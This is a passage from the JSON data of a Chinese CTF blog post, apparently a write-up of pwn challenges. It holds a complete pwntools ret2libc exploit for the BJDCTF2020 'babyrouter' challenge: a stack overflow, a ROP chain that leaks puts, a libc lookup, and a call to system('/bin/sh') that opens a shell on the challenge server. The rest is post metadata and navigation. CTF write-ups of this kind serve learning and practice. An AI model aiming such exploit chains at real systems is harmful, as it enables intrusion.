class=\"number\">0x28</span>+p64(ret)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"EXP-4\"><a href=\"#EXP-4\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./babyrouter&#x27;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class=\"number\">28044</span>)</span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./babyrouter&#x27;</span>)</span><br><span class=\"line\">puts_plt=elf.plt[<span class=\"string\">&quot;puts&quot;</span>]</span><br><span class=\"line\">puts_got=elf.got[<span class=\"string\">&quot;puts&quot;</span>]</span><br><span class=\"line\">start_addr=elf.symbols[<span class=\"string\">&quot;_start&quot;</span>]</span><br><span class=\"line\">pop_rdi_ret=<span class=\"number\">0x000400733</span></span><br><span class=\"line\">ret = <span class=\"number\">0x4004c9</span></span><br><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;Pull up your sword and tell me u story!&#x27;</span>,payload1)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">puts_addr=u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">libc=LibcSearcher(<span class=\"string\">&quot;puts&quot;</span>,puts_addr)</span><br><span class=\"line\"><span class=\"comment\">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class=\"line\">libcbase=puts_addr-libc.dump(<span class=\"string\">&quot;puts&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#system_addr = libcbase + libc.sym[&#x27;system&#x27;]</span></span><br><span class=\"line\">system_addr=libcbase+libc.dump(<span class=\"string\">&quot;system&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#binsh_addr = libcbase + libc.search(&#x27;/bin/sh\\0&#x27;).next()</span></span><br><span class=\"line\">binsh_addr=libcbase+libc.dump(<span class=\"string\">&quot;str_bin_sh&quot;</span>)</span><br><span class=\"line\">payload2 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x28</span>+p64(ret)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&#x27;Pull up your sword and tell me u story!&#x27;</span>,payload2)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n","text":"pwn03将附件拖进IDA中很容易发现存在栈溢出，但是没有后门函数以及system函数，也不能利用系统调用 所以函数地址泄露获得libc版本来获得system函数地址从而获得shell。具体步骤： 泄露 puts地址 获取 libc 版本 获取 system 地址与 /bin/s...","link":"","photos":[],"count_time":{"symbolsCount":"9.6k","symbolsTime":"9 mins."},"categories":[{"name":"刷题","slug":"刷题","count":6,"path":"api/categories/刷题.json"}],"tags":[{"name":"pwn","slug":"pwn","count":6,"path":"api/tags/pwn.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#pwn03\"><span class=\"toc-text\">pwn03</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#exp\"><span class=\"toc-text\">exp</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#pwn04\"><span class=\"toc-text\">pwn04</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#pwn07\"><span class=\"toc-text\">pwn07</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-1\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#pwn10\"><span class=\"toc-text\">pwn10</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-2\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E8%90%8C%E6%96%B0%E8%B5%9B-%E7%AD%BE%E5%88%B0%E9%A2%98\"><span class=\"toc-text\">萌新赛-签到题</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%86%85%E9%83%A8%E8%B5%9B-%E7%AD%BE%E5%88%B0%E9%A2%98\"><span class=\"toc-text\">内部赛-签到题</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-3\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#36D%E6%9D%AF-%E7%AD%BE%E5%88%B0\"><span class=\"toc-text\">36D杯-签到</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#BJDCTF2020-babyrouter\"><span class=\"toc-text\">BJDCTF2020-babyrouter</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-4\"><span class=\"toc-text\">EXP</span></a></li></ol></li></ol>","author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"bugkuMISC","uid":"aeac33b711f776d73f0726b5ddfdbdd8","slug":"bugku misc","date":"2021-10-16T13:24:11.000Z","updated":"2021-11-06T02:18:39.666Z","comments":true,"path":"api/articles/bugku misc.json","keywords":null,"cover":"https://i.loli.net/2021/05/06/nlZVfDTitYMJb6R.jpg","text":"BUGKU misc部分1 这是一张单纯的图片先看了一下属性，发现并没有什么有用的信息，打开就是上面那张图，没有上面异样， 直接丢winhex，拖至最底，发现是unicode加密 发现是unicode加密，直接解码成ASCII，得到flag 2 隐写看到题目就知道是图片隐写，对图...","link":"","photos":[],"count_time":{"symbolsCount":"1.5k","symbolsTime":"1 mins."},"categories":[{"name":"刷题","slug":"刷题","count":6,"path":"api/categories/刷题.json"}],"tags":[{"name":"misc","slug":"misc","count":3,"path":"api/tags/misc.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}}},"next_post":{"title":"BUU pwn","uid":"9c4b020a9215e27197217b9ca10cd6d8","slug":"BUU-PWN","date":"2021-10-16T05:47:11.000Z","updated":"2021-11-06T02:18:11.159Z","comments":true,"path":"api/articles/BUU-PWN.json","keywords":null,"cover":"https://i.loli.net/2021/05/24/6ewQX9kiC7ZpuOd.jpg","text":"原理栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不...","link":"","photos":[],"count_time":{"symbolsCount":"4.5k","symbolsTime":"4 mins."},"categories":[{"name":"刷题","slug":"刷题","count":6,"path":"api/categories/刷题.json"}],"tags":[{"name":"pwn","slug":"pwn","count":6,"path":"api/tags/pwn.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}}}}